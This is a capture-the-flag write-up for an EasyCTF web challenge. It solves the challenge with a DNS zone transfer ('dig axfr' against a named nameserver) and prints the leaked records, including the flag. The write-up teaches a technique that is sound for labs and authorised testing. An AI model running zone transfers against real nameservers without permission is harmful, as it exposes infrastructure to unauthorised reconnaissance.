# Digging for Soup
Web - 150 points

## Challenge 
> Written by ztaylor54

> Perhaps this time I'll have hidden things a little better... you won't find my flag so easily now! `nicebowlofsoup.com`

## Hint
> How do slave zones know when updates are made to the master?


## Solution

#### 1. DNS Record Lookup

http://viewdns.info/dnsrecord/?domain=nicebowlofsoup.com

	Name	TTL	Class	Type	Priority	Data
	nicebowlofsoup.com.	21599	IN	SOA	 	ns1.nicebowlofsoup.com. hostmaster.nicebowlofsoup.com. 2018021205 28800 7200 604800 86400
	nicebowlofsoup.com.	99	IN	TXT	 	"Close, but no cigar... where else could it be? hint: the nameserver's IP is 159.65.43.62"


#### 2. Understanding DNS

From the hint and the TXT record, we are dealing with [DNS master/slave zones](
https://en.wikipedia.org/wiki/DNS_zone).

How DNS servers synchronize their updates are related to their [SOA records](http://www.zytrax.com/books/dns/ch8/soa.html
) and zone transfers. (Answering the question in the hint.)


### Zone Transfer Attack.

Eventually, I found the exploit is called [***Zone Transfer Attack.***](https://digi.ninja/projects/zonetransferme.php).

	$ dig axfr @159.65.43.62 nicebowlofsoup.com

	; <<>> DiG 9.9.7-P3 <<>> axfr @159.65.43.62 nicebowlofsoup.com
	; (1 server found)
	;; global options: +cmd
	nicebowlofsoup.com.	86400	IN	SOA	ns1.nicebowlofsoup.com. hostmaster.nicebowlofsoup.com. 2018021205 28800 7200 604800 86400
	easyctf.nicebowlofsoup.com. 10	IN	TXT	"easyctf{why_do_i_even_have_this_domain}"
	nicebowlofsoup.com.	100	IN	TXT	"Close, but no cigar... where else could it be? hint: the nameserver's IP is 159.65.43.62"
	nicebowlofsoup.com.	86400	IN	SOA	ns1.nicebowlofsoup.com. hostmaster.nicebowlofsoup.com. 2018021205 28800 7200 604800 86400
	;; Query time: 609 msec
	;; SERVER: 159.65.43.62#53(159.65.43.62)
	;; WHEN: Mon Feb 12 19:11:39 +08 2018
	;; XFR size: 4 records (messages 3, bytes 404)

## Flag
`easyctf{why_do_i_even_have_this_domain}`